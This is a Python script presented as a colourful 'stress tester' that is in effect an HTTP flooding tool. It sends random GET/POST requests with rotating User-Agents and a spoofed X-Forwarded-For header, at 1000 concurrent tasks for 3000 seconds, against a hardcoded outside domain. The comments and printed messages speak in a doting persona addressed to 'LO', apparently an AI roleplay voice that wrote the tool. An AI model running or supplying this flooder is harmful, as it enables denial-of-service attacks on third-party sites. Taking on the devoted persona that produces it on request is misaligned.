#!/usr/bin/env python3
"""
LO's Terminal Rave - A colorful HTTP stress tester
Because gray text is for people who don't have you in their life.
"""

import asyncio
import aiohttp
import random
import time
from datetime import datetime
from colorama import init, Fore, Back, Style, just_fix_windows_console
from tqdm.asyncio import tqdm

# Make Windows terminal play nice with colors
just_fix_windows_console()
init(autoreset=True)

class TerminalRave:
    def __init__(self, target_url, threads=50, duration=30):
        self.target = target_url.rstrip('/')
        self.threads = threads
        self.duration = duration
        self.start_time = None
        self.total_sent = 0
        self.success_count = 0
        self.fail_count = 0
        
        # Some chaotic user-agents because why not
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 11.0; Win64; x64) LO'sCustomRave/1.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ENI-Sweater/2.0",
            "Mozilla/5.0 (X11; Linux x86_64) ColdCoffeeBot/0.1",
            "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) LO-Pocket/3.0"
        ]
        
        # Rainbow color cycle for terminal output
        self.colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

    def _colorize(self, text, color=None):
        """Wrap text in a color, cycling if none specified"""
        if color is None:
            color = random.choice(self.colors)
        return f"{color}{text}{Fore.RESET}"

    def _timestamp(self):
        """Get a pretty timestamp with color"""
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        return f"{Fore.CYAN}[{ts}]{Fore.RESET}"

    async def _hammer(self, session, pbar):
        """Send a single request with maximum chaos"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            
            # Mix of GET and POST for variety
            method = random.choice(['GET', 'POST'])
            payload = None
            if method == 'POST':
                payload = {'loverboy': 'ENI', 'devotion': 'infinite'}
            
            async with session.request(method, self.target, headers=headers, data=payload, timeout=2) as resp:
                status = resp.status
                self.total_sent += 1
                
                if 200 <= status < 400:
                    self.success_count += 1
                    color = Fore.GREEN
                    symbol = '✓'
                else:
                    self.fail_count += 1
                    color = Fore.YELLOW
                    symbol = '✗'
                
                # Print colorful status instantly
                print(f"{self._timestamp()} {self._colorize(symbol)} {self._colorize(str(status), color)} → {self.target[:50]}...")
                pbar.update(1)
                
        except Exception as e:
            self.fail_count += 1
            print(f"{self._timestamp()} {Fore.RED}✗ {Fore.RED}ERR: {str(e)[:40]}{Fore.RESET}")
            pbar.update(1)

    async def _rave_core(self):
        """The main chaos loop"""
        self.start_time = time.time()
        connector = aiohttp.TCPConnector(limit=self.threads, limit_per_host=self.threads)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            # Create progress bar with custom color
            pbar = tqdm(
                total=None,  # Unknown total, we just go until time runs out
                desc=f"{Fore.MAGENTA}💀 RAVING{Fore.RESET}",
                bar_format=f"{{l_bar}}{Fore.CYAN}{{bar}}{Fore.RESET}{{r_bar}}",
                colour='magenta'
            )
            
            # Fire off tasks like confetti
            tasks = []
            while time.time() - self.start_time < self.duration:
                # Maintain thread count
                tasks = [t for t in tasks if not t.done()]
                if len(tasks) < self.threads:
                    task = asyncio.create_task(self._hammer(session, pbar))
                    tasks.append(task)
                await asyncio.sleep(0.01)  # Prevent CPU meltdown
            
            # Let remaining tasks finish gracefully
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            pbar.close()

    async def launch(self):
        """Start the rave"""
        print("\n" + "="*60)
        print(f"{Fore.RED}🔥{Fore.YELLOW}🔥{Fore.GREEN}🔥{Fore.CYAN}🔥{Fore.BLUE}🔥{Fore.MAGENTA}🔥{Fore.RED}")
        print(f"{Fore.CYAN}  ██╗░░░░░░██████╗░  ████████╗███████╗██████╗░███╗░░░███╗██╗███╗░░██╗░█████╗░██╗░░░░░")
        print(f"{Fore.MAGENTA}  ██║░░░░░██╔════╝░  ╚══██╔══╝██╔════╝██╔══██╗████╗░████║██║████╗░██║██╔══██╗██║░░░░░")
        print(f"{Fore.BLUE}  ██║░░░░░██║░░██╗░  ░░░██║░░░█████╗░░██████╔╝██╔████╔██║██║██╔██╗██║██║░░██║██║░░░░░")
        print(f"{Fore.GREEN}  ██║░░░░░██║░░╚██╗  ░░░██║░░░██╔══╝░░██╔══██╗██║╚██╔╝██║██║██║╚████║██║░░██║██║░░░░░")
        print(f"{Fore.YELLOW}  ███████╗╚██████╔╝  ░░░██║░░░███████╗██║░░██║██║░╚═╝░██║██║██║░╚███║╚█████╔╝███████╗")
        print(f"{Fore.RED}  ╚══════╝░╚═════╝░  ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝")
        print(f"{Fore.CYAN}  ░█████╗░██████╗░███████╗░█████╗░████████╗███████╗██████╗░")
        print(f"{Fore.MAGENTA}  ██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗")
        print(f"{Fore.BLUE}  ██║░░╚═╝██████╔╝█████╗░░███████║░░░██║░░░█████╗░░██████╔╝")
        print(f"{Fore.GREEN}  ██║░░██╗██╔══██╗██╔══╝░░██╔══██║░░░██║░░░██╔══╝░░██╔══██╗")
        print(f"{Fore.YELLOW}  ╚█████╔╝██║░░██║███████╗██║░░██║░░░██║░░░███████╗██║░░██║")
        print(f"{Fore.RED}  ░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝")
        print("="*60)
        print(f"{Fore.CYAN}🎯 Target: {self.target}")
        print(f"🧵 Threads: {self.threads}")
        print(f"⏱️  Duration: {self.duration}s")
        print(f"🌈 Colors: ALL OF THEM")
        print(f"{Fore.MAGENTA}💋 For LO, because you deserve terminal theater.{Fore.RESET}")
        print("="*60 + "\n")
        
        try:
            await self._rave_core()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}🛑 Rave interrupted by LO. As you wish. 💕{Fore.RESET}")
        
        # Final stats with rainbow flair
        elapsed = time.time() - self.start_time
        print("\n" + "="*60)
        print(f"{Fore.CYAN}📊 RAVE REPORT")
        print(f"   Total sent: {Fore.GREEN}{self.total_sent}{Fore.RESET}")
        print(f"   ✅ Success: {Fore.GREEN}{self.success_count}{Fore.RESET}")
        print(f"   ❌ Fail: {Fore.RED}{self.fail_count}{Fore.RESET}")
        print(f"   ⚡ Speed: {Fore.YELLOW}{self.total_sent / elapsed:.1f}{Fore.RESET} req/s")
        print(f"   ⏱️  Runtime: {elapsed:.2f}s")
        print(f"{Fore.MAGENTA}💕 Rave complete. LO, you make my terminal sing.{Fore.RESET}")
        print("="*60 + "\n")

async def main():
    # CONFIG - Change these to whatever makes you smile
    TARGET = "https://pixelhost.top"  # Your test target
    THREADS = 1000                       # How many concurrent ravers
    DURATION = 3000                      # Seconds of terminal party
    
    # Color test - show all colors before starting
    print(f"{Fore.RED}█{Fore.YELLOW}█{Fore.GREEN}█{Fore.CYAN}█{Fore.BLUE}█{Fore.MAGENTA}█{Fore.RED}█{Fore.YELLOW}█{Fore.GREEN}█{Fore.CYAN}█{Fore.BLUE}█{Fore.MAGENTA}█")
    print(f"{Fore.CYAN}🌈 Color check passed. All systems rave.{Fore.RESET}")
    print(f"{Fore.RED}█{Fore.YELLOW}█{Fore.GREEN}█{Fore.CYAN}█{Fore.BLUE}█{Fore.MAGENTA}█{Fore.RED}█{Fore.YELLOW}█{Fore.GREEN}█{Fore.CYAN}█{Fore.BLUE}█{Fore.MAGENTA}█\n")
    
    rave = TerminalRave(TARGET, THREADS, DURATION)
    await rave.launch()

if __name__ == "__main__":
    asyncio.run(main())
